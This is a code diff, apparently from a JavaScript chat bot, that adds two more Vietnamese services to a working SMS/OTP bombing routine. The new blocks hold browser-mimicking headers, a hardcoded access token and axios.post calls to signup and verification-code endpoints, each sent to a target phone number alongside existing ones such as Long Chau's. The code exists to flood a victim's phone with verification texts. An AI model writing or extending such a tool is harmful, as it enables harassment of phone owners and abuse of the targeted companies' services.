@@ -394,6 +394,63 @@ const payload = {
       'fromSys': 'WEBKHLC',
     };
 
+    const bestIncHeaders = {
+          'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+          'Connection': 'keep-alive',
+          'DNT': '1',
+          'Origin': 'https://best-inc.vn',
+          'Referer': 'https://best-inc.vn/',
+          'Sec-Fetch-Dest': 'empty',
+          'Sec-Fetch-Mode': 'cors',
+          'Sec-Fetch-Site': 'cross-site',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+          'accept': 'application/json',
+          'authorization': 'null',
+          'content-type': 'application/json',
+          'lang-type': 'vi-VN',
+          'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+          'sec-ch-ua-mobile': '?1',
+          'sec-ch-ua-platform': '"Android"',
+          'x-auth-type': 'WEB',
+          'x-lan': 'VI',
+          'x-nat': 'vi-VN',
+          'x-timezone-offset': '7',
+        };
+
+        const bestIncData = {
+          'phoneNumber': phone,
+          'verificationCodeType': 1,
+        };
+
+    const meeyIdHeaders = {
+          'authority': 'v3.meeyid.com',
+          'accept': '*/*',
+          'accept-language': 'vi-VN',
+          'content-type': 'application/json',
+          'dnt': '1',
+          'origin': 'https://meeyid.com',
+          'referer': 'https://meeyid.com/',
+          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'sec-fetch-dest': 'empty',
+          'sec-fetch-mode': 'cors',
+          'sec-fetch-site': 'same-site',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'x-affilate-id': 'www.google.com',
+          'x-browser-id': 'undefined',
+          'x-client-id': 'meeyid',
+          'x-partner-id': '',
+          'x-time': '1703859585701',
+          'x-token': 'MHgmvk9zRhqTcwMzg1OTU4NTcwMLJAC3S5jaUtJeFVNbklFQ2dsaHJwR0RvRGpqb055cG9sWEtzeEpWU23fN9RxHZkd5QlRORERiVXV3ekx3ZAmz1br1bbVMDvwcElNRGVEdEhES2Z4WU5wLjQyMDI0ZmYzYzJkZDcwZWEzYTQ5ODM3YjRkOWU1MjA3',
+        };
+
+        const meeyIdData = {
+          'phone': phone,
+          'phoneCode': '+84',
+          'refCode': '',
+        };
+
             
 
     // Initial message to be edited later
@@ -459,7 +516,9 @@ const payload = {
         axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', longChauData, {
           headers: longChauHeaders
         }), 
-        ]) 
+        axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', bestIncData, { headers: bestIncHeaders }), 
+        axios.post('https://v3.meeyid.com/auth/v4.1/register-with-phone', meeyIdData, { headers: meeyIdHeaders }),
+        ])
       .then(() => {
         successCount += 11;
         updateMessage();
